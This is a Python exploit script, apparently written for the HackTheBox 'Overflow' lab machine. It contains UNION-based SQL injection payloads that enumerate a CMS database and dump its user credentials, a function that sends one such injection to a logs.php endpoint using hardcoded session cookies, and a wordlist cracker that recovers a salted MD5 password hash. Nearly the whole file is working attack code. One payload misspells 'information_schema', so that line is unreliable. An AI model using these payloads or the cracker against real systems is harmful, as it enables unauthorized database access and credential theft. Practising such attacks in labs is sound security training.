#!/usr/bin/python3

import requests
from pwn import *
from pprint import pprint
from hashlib import md5



MAIN_URL = "http://overflow.htb/"

DICT_LIST = "/usr/share/wordlists/rockyou.txt"
PASS = "e3d748d58b58657bfa4dffe2def0b1c7"
SALT = "6c2d17f37e226486"




SQL_PAYLOADS = {

    "databases":"union select 1,2,schema_name from information_schema.schemata-- -",
    "tables":"union select 1,2, table_name from information_schema.tables where table_schema='database_name'-- -",
    "rows":"union select 1,2,column_name from information_scheme.columns where table_schema='' and table_name=''",
    "rows_information":"union select 1,2,group_concat(username, '0x3a', password) from cmsmsdb.cms_users-- -"
}




def enumeration():

    log.progress("performing database enumeration...")
    auth_cookies = "BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA"
    cms_cookies = "i4v7mamlaopv2ge8o8qjgvth76"
    over_ress = requests.get(url=MAIN_URL+"home/logs.php?name=admin') union select 1,2,group_concat(username, 0x3a, password) from cmsmsdb.cms_users-- -", 
            cookies={"auth":auth_cookies, "CMSSESSIDf25decdf38ae":cms_cookies})
    
    if over_ress.status_code != 200:
        log.failure("Error in the table enumeration")
        exit(1)
    print(over_ress.text)
    log.success("process was done successfully")



def password_cracker():
    
    with open(DICT_LIST, "rb") as file:
        for x in file:
            if md5(SALT.encode() + x.strip()).hexdigest() == PASS:
                log.success(f"The password for editor is: {x.strip().decode()}")
                exit(0)




def main():
    
    try:
        # enumeration()
        password_cracker()

    except Exception as e:
        print(str(e))
        exit(1)


    except KeyboardInterrupt:
        log.info("\n\nExiting...\n\n")
        exit(0)




if __name__ == "__main__":
    main()
